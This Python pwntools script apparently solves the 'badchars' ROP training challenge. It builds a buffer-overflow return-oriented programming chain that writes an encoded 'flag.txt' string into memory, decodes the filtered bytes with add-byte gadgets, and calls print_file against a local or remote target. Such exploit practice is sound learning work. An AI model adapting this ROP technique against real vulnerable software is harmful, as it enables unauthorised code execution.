from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./badchars")

"""
    'x', 'g', 'a', '.'
    78   67   61   2E


"""

class ROP_Gadget:
    data = 0x0000000000601028 + 8
    mov = 0x0000000000400634 # mov qword ptr [r13], r12; ret;
    pop = 0x000000000040069c # pop r12; pop r13; pop r14; pop r15; ret;
    trash = 0x0000000000000000
    flag = b"fl`f-twt"
    pop_r14_r15 = 0x00000000004006a0
    add = 0x000000000040062c # add byte ptr [r15], r14b; ret;
    a = data + 2
    g = data + 3
    period = data + 4
    ex = data + 6
    uno = 0x00000001
    pop_rdi = 0x00000000004006a3
    print_file = 0x00400510


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(40)
    input("PAUSE...")

    payload = [
        padding,
        ROP_Gadget.pop,
        ROP_Gadget.flag,
        ROP_Gadget.data,
        ROP_Gadget.uno,
        ROP_Gadget.a,
        ROP_Gadget.mov,
        ROP_Gadget.add,
        ROP_Gadget.pop_r14_r15,
        ROP_Gadget.uno,
        ROP_Gadget.g,
        ROP_Gadget.add,
        ROP_Gadget.pop_r14_r15,
        ROP_Gadget.uno,
        ROP_Gadget.period,
        ROP_Gadget.add,
        ROP_Gadget.pop_r14_r15,
        ROP_Gadget.uno,
        ROP_Gadget.ex,
        ROP_Gadget.add,
        ROP_Gadget.pop_rdi,
        ROP_Gadget.data,
        ROP_Gadget.print_file
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()